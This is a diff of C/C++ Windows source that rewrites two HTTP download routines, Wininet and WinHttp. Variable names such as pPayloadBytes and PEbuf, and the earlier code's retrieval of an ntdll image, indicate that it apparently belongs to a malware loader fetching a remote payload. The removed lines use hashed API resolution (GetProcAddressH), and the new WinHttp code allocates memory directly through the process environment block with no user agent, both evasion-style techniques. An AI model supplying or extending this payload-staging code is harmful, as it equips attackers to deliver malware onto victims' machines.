@@ -1,41 +1,29 @@
 #include <Windows.h>
 
-/*
 BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 	HMODULE hWnet = LoadLibraryW(L"wininet.dll");
 
-	typedef HINTERNET(WINAPI* dInternetOpenA)(IN LPCSTR lpszAgent, IN DWORD  dwAccessType, IN LPCSTR lpszProxy, IN LPCSTR lpszProxyBypass, IN DWORD  dwFlags);
-	typedef HINTERNET(WINAPI* dInternetOpenUrlA)(IN HINTERNET hInternet, IN LPCSTR lpszUrl, IN LPCSTR lpszHeaders, IN DWORD dwHeadersLength, IN DWORD dwFlags, IN DWORD_PTR dwContext);
-	typedef BOOL(WINAPI* dInternetReadFile)(IN HINTERNET hFile, IN LPVOID lpBuffer, IN DWORD dwNumberOfBytesToRead, IN LPDWORD lpdwNumberOfBytesRead);
-	typedef BOOL(WINAPI* dInternetSetOptionA)(IN HINTERNET hInternet, IN DWORD dwOption, IN LPVOID lpBuffer, IN DWORD dwBufferLength);
-	typedef BOOL(WINAPI* dInternetCloseHandle)(IN HINTERNET hInternet);
 
-	dInternetOpenA pInternetOpenA = (dInternetOpenA)GetProcAddressH(hWnet, "InternetOpenA");
-	dInternetOpenUrlA pInternetOpenUrlA = (dInternetOpenUrlA)GetProcAddressH(hWnet, "InternetOpenUrlA");
-	dInternetReadFile pInternetReadFile = (dInternetReadFile)GetProcAddressH(hWnet, "InternetReadFile");
-	dInternetSetOptionA pInternetSetOptionA = (dInternetSetOptionA)GetProcAddressH(hWnet, "InternetSetOptionA");
-	dInternetCloseHandle pInternetCloseHandle = (dInternetCloseHandle)GetProcAddressH(hWnet, "InternetCloseHandle");
+	BOOL		bSTATE        = TRUE;
 
-	BOOL		bSTATE = TRUE;
+	HINTERNET	hInternet     = NULL,
+		        hInternetFile = NULL;
 
-	HINTERNET	hInternet = NULL,
-		hInternetFile = NULL;
+	DWORD		dwBytesRead   = NULL;
 
-	DWORD		dwBytesRead = NULL;
-
-	SIZE_T	   	 sSize = NULL;
-	PBYTE		pBytes = NULL,
-		pTmpBytes = NULL;
+	SIZE_T	   	sSize         = NULL;
+	PBYTE		pBytes        = NULL,
+		        pTmpBytes     = NULL;
 
 
-	hInternet = pInternetOpenA(NULL, NULL, NULL, NULL, NULL);
+	hInternet = InternetOpenA(NULL, NULL, NULL, NULL, NULL);
 	if (hInternet == NULL) {
 		PRINTA("[!] InternetOpenW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
 	}
 
 
-	hInternetFile = pInternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
+	hInternetFile = InternetOpenUrlA(hInternet, szUrl, NULL, NULL, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, NULL);
 	if (hInternetFile == NULL) {
 		PRINTA("[!] InternetOpenUrlW Failed With Error : %d \n", GetLastError());
 		bSTATE = FALSE; goto _EndOfFunction;
@@ -48,7 +36,7 @@ BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
 	while (TRUE) {
 
-		if (!pInternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
+		if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
 			PRINTA("[!] InternetReadFile Failed With Error : %d \n", GetLastError());
 			bSTATE = FALSE; goto _EndOfFunction;
 		}
@@ -64,8 +52,8 @@ BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 			bSTATE = FALSE; goto _EndOfFunction;
 		}
 
-		CopyMemoryex((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
-		memset(pTmpBytes, '\0', dwBytesRead);
+		MemCopy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
+		MemSet(pTmpBytes, '\0', dwBytesRead);
 
 		if (dwBytesRead < 1024) {
 			break;
@@ -77,125 +65,80 @@ BOOL Wininet(LPCSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
 
 _EndOfFunction:
 	if (hInternet)
-		pInternetCloseHandle(hInternet);
+		InternetCloseHandle(hInternet);
 	if (hInternetFile)
-		pInternetCloseHandle(hInternetFile);
+		InternetCloseHandle(hInternetFile);
 	if (hInternet)
-		pInternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
+		InternetSetOptionA(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0);
 	if (pTmpBytes)
 		LocalFree(pTmpBytes);
 	return bSTATE;
 }
-*/
 
-/*
-BOOL Winhttp(wchar_t* whost, DWORD port, wchar_t* wresource) {
-    struct DLL dll;
-    std::vector<unsigned char> PEbuf;
-    DWORD dwSize = 0;
+void WinHttp( _In_ LPWSTR Host, _In_ int Port, _In_ LPWSTR Path, _Out_ PBYTE *ByteCodes, _Out_ DWORD *ByteSize ) {
+    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
+    WCHAR wMethodRequest[] = L"GET";
+    
+    BOOL  bResults      = FALSE;
+    DWORD dwSize       = 0;
     DWORD dwDownloaded = 0;
-    LPSTR pszOutBuffer = NULL;
-    BOOL  bResults = FALSE;
-    HINTERNET  hSession = NULL,
-        hConnect = NULL,
-        hRequest = NULL;
-    // Use WinHttpOpen to obtain a session handle.
-    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
-        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
-        WINHTTP_NO_PROXY_NAME,
-        WINHTTP_NO_PROXY_BYPASS, 0);
+    BYTE* pTempBuffer  = NULL;
 
+    PVOID Heap = NtCurrentTeb()->ProcessEnvironmentBlock->ProcessHeap;
 
-    // Specify an HTTP server.
-    if (hSession)
-        hConnect = WinHttpConnect(hSession, whost,
-            port, 0);
-    else
-        printf("Failed in WinHttpConnect (%u)\n", GetLastError());
+    hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) {
+        goto END;
+    }
 
-    // Create an HTTP request handle.
-    if (hConnect)
-        hRequest = WinHttpOpenRequest(hConnect, L"GET", wresource,
-            NULL, WINHTTP_NO_REFERER,
-            WINHTTP_DEFAULT_ACCEPT_TYPES,
-            NULL);
-    else
-        printf("Failed in WinHttpOpenRequest (%u)\n", GetLastError());
+    hConnect = WinHttpConnect(hSession, Host, Port, 0);
+    if (!hConnect) {
+        goto END;
+    }
 
-    // Send a request.
-    if (hRequest)
-        bResults = WinHttpSendRequest(hRequest,
-            WINHTTP_NO_ADDITIONAL_HEADERS,
-            0, WINHTTP_NO_REQUEST_DATA, 0,
-            0, 0);
-    else
-        printf("Failed in WinHttpSendRequest (%u)\n", GetLastError());
+    hRequest = WinHttpOpenRequest(hConnect, wMethodRequest, Path, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
+    if (!hRequest) {
+        goto END;
+    }
 
-    // End the request.
-    if (bResults)
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
-    else printf("Failed in WinHttpReceiveResponse (%u)\n", GetLastError());
+    bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
+    if (!bResults) {
+        goto END;
+    }
 
-    // Keep checking for data until there is nothing left.
-    if (bResults)
-        do
-        {
-            // Check for available data.
-            dwSize = 0;
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
-                printf("Error %u in WinHttpQueryDataAvailable (%u)\n", GetLastError());
+    bResults = WinHttpReceiveResponse(hRequest, NULL);
+    if (!bResults) {
+        goto END;
+    }
 
-            // Allocate space for the buffer.
-            pszOutBuffer = new char[dwSize + 1];
-            if (!pszOutBuffer)
-            {
-                printf("Out of memory\n");
-                dwSize = 0;
-            }
-            else
-            {
-                // Read the Data.
-                ZeroMemory(pszOutBuffer, dwSize + 1);
+    DWORD dwContentLength = 0;
+    DWORD dwSizeSize = sizeof(DWORD);
+    bResults = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_CONTENT_LENGTH | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwContentLength, &dwSizeSize, NULL);
+    if (!bResults) {
+        goto END;
+    }
 
-                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
-                    dwSize, &dwDownloaded))
-                    printf("Error %u in WinHttpReadData.\n", GetLastError());
-                else {
+    pTempBuffer = (BYTE*)RtlAllocateHeap(Heap, 0, dwContentLength);
+    if (!pTempBuffer) {
+        goto END;
+    }
 
-
-                    PEbuf.insert(PEbuf.end(), pszOutBuffer, pszOutBuffer + dwDownloaded);
-                     
-                    
-
-                }
-                delete[] pszOutBuffer;
-
-            }
-
-        } while (dwSize > 0);
-
-        if (PEbuf.empty() == TRUE)
-        {
-            printf("Failed in retrieving the PE");
+    do {
+        bResults = WinHttpReadData(hRequest, (LPVOID)(pTempBuffer + dwDownloaded), dwContentLength - dwDownloaded, &dwSize);
+        if (bResults) {
+            dwDownloaded += dwSize;
+        } else {
+            RtlFreeHeap(Heap, 0, pTempBuffer);
+            pTempBuffer = NULL; // Ensure pTempBuffer is NULL if allocation fails
+            goto END;
         }
+    } while (dwSize > 0 && dwDownloaded < dwContentLength);
 
-        // Report any errors.
-        if (!bResults)
-            printf("Error %d has occurred.\n", GetLastError());
+    *ByteCodes = pTempBuffer;
+    *ByteSize = dwContentLength;
 
-        // Close any open handles.
-        if (hRequest) WinHttpCloseHandle(hRequest);
-        if (hConnect) WinHttpCloseHandle(hConnect);
-        if (hSession) WinHttpCloseHandle(hSession);
-
-        size_t size = PEbuf.size();
-        //printf("size : %d\n", size);
-        char* ntdll = (char*)malloc(size);
-        for (int i = 0; i < PEbuf.size(); i++) {
-            ntdll[i] = PEbuf[i];
-        }
-        dll.ntdll = ntdll;
-        dll.size = size;
-        return dll;
+END:
+    if (hRequest) WinHttpCloseHandle(hRequest);
+    if (hConnect) WinHttpCloseHandle(hConnect);
+    if (hSession) WinHttpCloseHandle(hSession);
 }
-*/
